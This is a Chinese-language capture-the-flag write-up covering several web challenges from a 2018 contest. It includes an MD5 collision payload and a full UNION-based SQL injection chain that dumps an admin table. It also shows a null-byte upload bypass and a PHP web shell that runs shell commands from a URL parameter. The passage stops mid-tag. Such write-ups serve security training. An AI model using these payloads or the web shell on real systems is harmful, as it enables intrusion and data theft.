    <content type="html"><![CDATA[<h3 id="1-Input"><a href="#1-Input" class="headerlink" title="1. Input"></a>1. Input</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8003/" target="_blank" rel="noopener">http://114.55.36.69:8003/</a><br>进去后一个输入框，一个提交<br><a id="more"></a><br>但是这个按钮好像是无效的 点了也没有提交我们输入的内容</p></blockquote><p><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/1.png" alt><br>然后查看源代码，发现有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function check()&#123;</span><br><span class="line">        var flag &#x3D; document.getElementById(&quot;flag&quot;).value;</span><br><span class="line">        var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">        var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">        var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">        var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br><span class="line">        if (str &#x3D;&#x3D; flag)&#123;</span><br><span class="line">            alert(&quot;恭喜你已经找到flag！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>然后就好说了，把<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var str &#x3D; &quot;d84d9657e5e5e&quot; || 0;</span><br><span class="line">var str &#x3D; str + (&quot;ad2ad3fe&quot; &amp;&amp; 2);</span><br><span class="line">var str &#x3D; str + &quot;a2da9494b8&quot; + &quot;ddea4fd4&quot;;</span><br><span class="line">var str &#x3D; str.split(&quot;&quot;).reverse().join(&quot;&quot;);</span><br></pre></td></tr></table></figure><br>这4行代码粘贴到浏览器的控制台中，然后让浏览器弹出str的值就可以了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/2.png" alt><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/3.png" alt><br>献上flag:    <code>4df4aedd8b4949ad2a2e5e5e7569d48d</code></p><h3 id="2-简单的MD5"><a href="#2-简单的MD5" class="headerlink" title="2.简单的MD5"></a>2.简单的MD5</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8004/" target="_blank" rel="noopener">http://114.55.36.69:8004/</a><br>进去后直接查看页面源代码：<code>easy MD5 cracking &lt;!--$_POST[&#39;data1&#39;]!=$_POST[&#39;data2&#39;]--&gt;fail</code><br>里面有这个东西</p></blockquote><p>分析之后发现，这个就是普通的PHP弱类型，用数组就行了<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/4.png" alt><br><code>flag{401cf19d304e557349fecda18110c138}</code></p><h3 id="3-MD5"><a href="#3-MD5" class="headerlink" title="3. MD5"></a>3. MD5</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8006/" target="_blank" rel="noopener">http://114.55.36.69:8006/</a><br>查看源代码有这句话：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if((string)$_POST[&#39;data1&#39;]!&#x3D;&#x3D;(string)$_POST[&#39;data2&#39;]&amp;&amp;md5($_POST[&#39;data1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;data2&#39;]))</span><br></pre></td></tr></table></figure><br>这个用的是MD5碰撞<br>想学习的可以看这个博客：<a href="https://blog.csdn.net/wy_97/article/details/79088218" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/79088218</a><br>这里直接给出payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">data2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><br>提交时需要用urlencode一下<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/5.png" alt><br><code>flag{9bd1ee7355b58e53214adb9a37b4cb82}</code></p></blockquote><h3 id="4-新闻搜索"><a href="#4-新闻搜索" class="headerlink" title="4.新闻搜索"></a>4.新闻搜索</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8010/" target="_blank" rel="noopener">http://114.55.36.69:8010/</a><br>刚开始没思路，后来看到源代码里面有一段JavaScript代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function myFunction()</span><br><span class="line">&#123;</span><br><span class="line">var x&#x3D;document.getElementById(&quot;number&quot;).value;</span><br><span class="line">    var a&#x3D;document.getElementById(&quot;word&quot;).value;</span><br><span class="line">    var b&#x3D;a.replace(&#x2F;[\ |\~|\&#96;|\!|\@|\#|\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\&#x3D;|\||\\|\[|\]|\&#123;|\&#125;|\;|\:|\&quot;|\&#39;|\,|\&lt;|\.|\&gt;|\&#x2F;|\?|\·|\！|\（|\）|\￥|\——|\……|\【|\】|\、|\；|\：|\‘|\“|\”|\’|\，|\。|\、|\《|\》|\？|\ ]&#x2F;g,&quot;&quot;);</span><br><span class="line">    if(a.length!&#x3D;b.length)</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入正确字符。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">      document.getElementById(&quot;word&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line">    else if(isNaN(x))</span><br><span class="line">    &#123;</span><br><span class="line">      alert(&quot;请输入数字。&quot;);</span><br><span class="line">      document.getElementById(&quot;number&quot;).value &#x3D; &#39;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><br>许多字符被过滤掉了，猜测可能要用SQL注入，而它代码放到了前端，也就是说过滤只能从前端过滤，用hackbar注入它是检测不到的<br>直接给出payload:<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/6.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET:http:&#x2F;&#x2F;114.55.36.69:8010&#x2F;</span><br><span class="line">POST:</span><br><span class="line">word&#x3D;-1&#39; union select 1,database(),2%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;&#39;news&#39;%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(column_name),2 from information_schema.columns where table_name&#x3D;&#39;admin&#39;%23&amp;number&#x3D;5</span><br><span class="line">word&#x3D;-1&#39; union select 1,group_concat(flag),2 from admin%23&amp;number&#x3D;5</span><br></pre></td></tr></table></figure></p></blockquote><pre><code>flag{f98505d1d12f50a0bd9463e90876630}</code></pre><h3 id="5-Game"><a href="#5-Game" class="headerlink" title="5.Game"></a>5.Game</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8011/" target="_blank" rel="noopener">http://114.55.36.69:8011/</a><br>emmmm  贪吃蛇挺好玩的</p></blockquote><p>查看源代码<br>  <img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/7.png" alt><br>两个链接，随便点一点<br>在<code>game.js</code>中发现了点东西</p><p><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/8.png" alt><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻   &#x2F;&#x2F;*´∇｀*&#x2F; [&#39;_&#39;]; o&#x3D;(ﾟｰﾟ)  &#x3D;_&#x3D;3; c&#x3D;(ﾟΘﾟ) &#x3D;(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) &#x3D;(ﾟΘﾟ)&#x3D; (o^_^o)&#x2F; (o^_^o);(ﾟДﾟ)&#x3D;&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] &#x3D;((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] &#x3D; ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)&#x3D;(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] &#x3D;(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)&#x3D;((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ&#x3D;&#x3D;3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+&#x3D;(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]&#x3D;&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ&#x3D;(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)&#x3D;(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]&#x3D;&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (o^_^o)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (c^_^o)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</span><br></pre></td></tr></table></figure><br>好长啊<br>放到aaencode里面去<br>给出解码网站：<a href="https://tool.zcmzcm.org/aadecode" target="_blank" rel="noopener">https://tool.zcmzcm.org/aadecode</a><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/9.png" alt><br>    Flag{660332922504a5f06dd871a7fe78ba9c}</p><h3 id="6-参数提交"><a href="#6-参数提交" class="headerlink" title="6.参数提交"></a>6.参数提交</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8012/" target="_blank" rel="noopener">http://114.55.36.69:8012/</a><br>这个就没啥好说的了<br>POST提交参数就行了<br>    flag=1111111111111111<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/10.png" alt><br>    flag{858a14671c27804b63e6e96b0acdfdd7}</p></blockquote><h3 id="7-刚写了个小站"><a href="#7-刚写了个小站" class="headerlink" title="7.刚写了个小站"></a>7.刚写了个小站</h3><blockquote><p>题目地址：<a href="http://114.55.36.69:8014/" target="_blank" rel="noopener">http://114.55.36.69:8014/</a><br>这个题稍微有点坑，花了点力气<br>上来先注册一个号<br>进去后是个网站，先扫描后台发现有<code>url/uploads/</code>这个目录<br>然后想到这个题有可能是文件上传，果然在网站的侧栏发现了<code>upload</code>按钮<br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/11.png" alt><br>上传其实很简单，后缀改成<code>.php.jpg</code>(这个题只能提交jpg,不能提交png)<br>然后抓包在php后边加个空格，在十六进制里把空格的20改成00截断，这样就可以上传成功<br>上传成功后用菜刀连不上，应该是网站加了安全保护措施<br>所以只能在URL框里执行命令了<br>上传的木马里写入这样的代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$arg &#x3D; $_GET[&#39;cmd&#39;];</span><br><span class="line">if ($arg) &#123;</span><br><span class="line">system(&quot;$arg&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>然后在URL里直接使用<code>http://114.55.36.69:8014/upload/8a30ec6807f71bc69d096d8e4d501ade/u.php?cmd=ls</code><br><img src="/2018/10/28/2018WEB%E5%AE%89%E5%85%A8%E6%B5%8B%E8%AF%95%E7%A7%8B%E5%AD%A3%E9%A2%84%E9%80%89%E8%B5%9B/12.png" 